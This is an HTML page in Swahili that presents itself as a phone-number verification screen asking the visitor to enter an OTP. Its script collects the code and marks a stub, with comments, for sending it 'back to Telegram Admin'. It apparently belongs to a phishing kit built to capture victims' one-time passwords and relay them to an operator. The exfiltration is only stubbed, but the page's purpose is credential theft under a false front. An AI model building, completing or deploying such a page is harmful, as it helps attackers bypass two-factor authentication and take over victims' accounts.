<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verification</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    .otp-box {
      width: 45px; height: 50px; border: 2px solid #e2e8f0; border-radius: 10px;
      text-align: center; font-size: 1.5rem; font-weight: bold; outline: none;
    }
    .otp-box:focus { border-color: #003366; }
  </style>
</head>
<body class="bg-white flex flex-col items-center justify-center min-h-screen p-6">
  <div class="w-full max-w-sm text-center">
    <h2 id="title" class="text-xl font-bold text-[#003366] mb-2 italic">Thibitisha Namba</h2>
    <p class="text-gray-500 mb-8 text-sm">Tumekutumia namba ya siri (OTP). Tafadhali iingize hapa chini.</p>
    
    <div id="otp-container" class="flex justify-center gap-2 mb-10">
        <!-- Boxes generated by JS -->
    </div>

    <p id="timer" class="text-xs text-gray-400 italic">Subiri sekunde 59 kabla ya kutuma tena</p>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const len = parseInt(params.get('len')) || 6;
    const sessionId = params.get('id');
    const container = document.getElementById('otp-container');
    const boxes = [];

    // 1. Create Dynamic Boxes
    for (let i = 0; i < len; i++) {
        const input = document.createElement('input');
        input.type = 'tel';
        input.maxLength = 1;
        input.className = 'otp-box';
        input.dataset.index = i;
        container.appendChild(input);
        boxes.push(input);

        input.addEventListener('input', (e) => {
            if (e.target.value && i < len - 1) boxes[i + 1].focus();
            
            const otp = boxes.map(b => b.value).join('');
            if (otp.length === len) submitOTP(otp);
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && i > 0) boxes[i - 1].focus();
        });
    }

    async function submitOTP(otp) {
        // Logic to send OTP back to Telegram Admin
        console.log("Sending OTP:", otp);
        // You can add a new fetch here to notify admin of the OTP
    }
  </script>
</body>
</html>
